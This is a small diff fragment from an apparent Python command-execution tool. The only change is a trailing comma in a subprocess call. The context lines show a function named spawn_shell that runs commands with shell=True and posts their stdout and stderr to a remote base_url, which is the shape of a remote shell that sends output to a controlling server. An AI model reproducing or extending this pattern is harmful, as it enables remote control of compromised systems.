@@ -77,7 +77,7 @@ def spawn_shell(command, session, base_url):
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
-                           stdin=subprocess.PIPE
+                           stdin=subprocess.PIPE,
                            )
     session.post(url=base_url, data=cmd.stdout.read())
     session.post(url=base_url, data=cmd.stderr.read())
